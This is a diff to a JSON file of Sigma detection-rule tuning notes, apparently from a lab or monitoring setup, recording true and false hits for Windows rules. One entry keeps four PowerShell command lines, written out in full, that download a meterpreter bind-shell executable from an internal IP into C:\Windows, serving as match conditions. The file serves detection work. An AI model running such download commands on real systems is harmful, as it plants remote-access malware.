@@ -318,7 +318,7 @@
     "conditions": {
       "entry1": [
         "document.data.process.command_line",
-        "cmd.exe /c echo drzzer > \\\\.\\pipe\\drzzer"
+        "cmd.exe /c echo * > \\\\.\\pipe\\*"
       ]
     }
   },
@@ -423,7 +423,8 @@
   "Suspicious Remote Thread Source": {
     "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/create_remote_thread/sysmon_susp_remote_thread_source.yml",
     "_true_hits": [
-      "Scheduled tasks spawning a new thread | ExecuteMalwareAttack"
+      "Scheduled tasks spawning a new thread | ExecuteMalwareAttack",
+      "Bank-of-Nuthington.exe doing meterpreter things | ???"
     ],
     "_false_hits": [
       "spoolssv.exe",
@@ -440,6 +441,94 @@
         "Bank-of-Nuthington.exe"
       ]
     }
+  },
+
+
+  "Suspicious Schtasks Schedule Types": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_susp_schtasks_schedule_type.yml",
+    "_true_hits": [],
+    "_false_hits": [],
+    "conditions": {}
+  },
+
+
+  "Sysmon Blocked Executable": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/sysmon/sysmon_file_block_exe.yml",
+    "_true_hits": [],
+    "_false_hits": [
+      "Definitely caused by incorrect mapping. Is supposed to catch file block events from sysmon, which we haven't even set up afaik"
+    ],
+    "conditions": {}
+  },
+
+
+  "Sysmon Configuration Change": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/sysmon/sysmon_config_modification.yml",
+    "_true_hits": [],
+    "_false_hits": [
+      "IOMMU fault reporting initialization",
+      "Windows registry cleanup on all kinds of entries, XBox, BingWeather, WindowsAlarms, etc"
+    ],
+    "conditions": {}
+  },
+
+
+  "System DLL Sideloading From Non System Locations": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/image_load/image_load_side_load_from_non_system_location.yml",
+    "_true_hits": [],
+    "_false_hits": [
+      "cleanmgr.exe stores some .dlls in a temp folder",
+      "mscorsvw.exe sideloads windows.storage.dll"
+    ],
+    "conditions": {}
+  },
+
+
+  "Verclsid.exe Runs COM Object": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_verclsid_runs_com.yml",
+    "_true_hits": [],
+    "_false_hits": [
+      "Seems to be legitimate activity of RuntimeBroker.exe"
+    ],
+    "conditions": {}
+  },
+
+
+  "Windows Suspicious Use Of Web Request in CommandLine": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd.yml",
+    "_true_hits": [
+      "Downloading meterpreter_bind_tcp.exe | DownloadMalwareAttack"
+    ],
+    "_false_hits": [],
+    "conditions": {
+      "entry1": [
+        "document.data.process.command_line",
+        "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully."
+      ],
+      "entry2": [
+        "document.data.process.command_line",
+        "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\")"
+      ],
+      "entry3": [
+        "document.data.process.command_line",
+        "powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\")"
+      ],
+      "entry4": [
+        "document.data.process.command_line",
+        "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"
+      ]
+    }
+  },
+
+
+  "WMI Event Subscription": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/wmi_event/sysmon_wmi_event_subscription.yml",
+    "_true_hits": [],
+    "_false_hits": [
+      "Leap second config update",
+      "Last shutdown info"
+    ],
+    "conditions": {}
   },
 
 
